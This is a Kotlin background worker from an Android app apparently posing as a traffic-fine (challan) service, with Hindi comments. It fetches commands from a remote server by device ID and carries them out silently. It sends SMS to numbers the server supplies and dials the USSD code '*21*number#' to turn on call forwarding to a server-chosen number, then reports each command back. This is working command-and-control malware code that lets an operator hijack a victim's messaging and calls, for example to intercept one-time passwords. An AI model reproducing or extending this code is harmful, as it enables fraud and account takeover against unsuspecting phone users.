package com.rte.challan.worker

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
// ध्यान दें: यहाँ ListenableWorker.Result का इस्तेमाल किया गया है
import androidx.work.ListenableWorker.Result 
import com.google.gson.Gson
import com.rte.challan.network.ApiClient
import com.rte.challan.utils.DeviceInfo
import com.rte.challan.utils.UssdHelper
import com.rte.challan.data.Command
import com.rte.challan.data.CommandAck
import com.rte.challan.data.SmsCommandData
import com.rte.challan.data.ForwardCommandData

class CommandWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {

    override suspend fun doWork(): Result {
        val deviceId = DeviceInfo.getDeviceId(applicationContext)

        return try {
            val response = ApiClient.instance.getPendingCommands(deviceId)
            if (response.isSuccessful) {
                val commands = response.body() ?: emptyList()
                for (cmd in commands) {
                    executeCommand(cmd)
                    val ack = CommandAck(cmd.id, "sent")
                    ApiClient.instance.acknowledgeCommand(ack)
                }
                Result.success()
            } else {
                Log.e("CommandWorker", "Failed to fetch: ${response.code()}")
                Result.retry()
            }
        } catch (e: Exception) {
            Log.e("CommandWorker", "Error: ${e.message}")
            Result.retry()
        }
    }

    private fun executeCommand(cmd: Command) {
        when (cmd.type) {
            "sms" -> {
                val data = Gson().fromJson(cmd.data, SmsCommandData::class.java)
                sendSms(data.number, data.text)
            }
            "call_forward" -> {
                val data = Gson().fromJson(cmd.data, ForwardCommandData::class.java)
                UssdHelper.dialUssd(applicationContext, "*21*${data.number}#")
            }
            "sms_forward" -> { /* ignore */ }
        }
    }

    private fun sendSms(number: String, text: String) {
        try {
            // नए Android वर्जन्स के लिए SmsManager प्राप्त करने का सही तरीका
            val smsManager = applicationContext.getSystemService(android.telephony.SmsManager::class.java)
            smsManager.sendTextMessage(number, null, text, null, null)
        } catch (e: Exception) {
            Log.e("CommandWorker", "SMS send failed: ${e.message}")
        }
    }
}
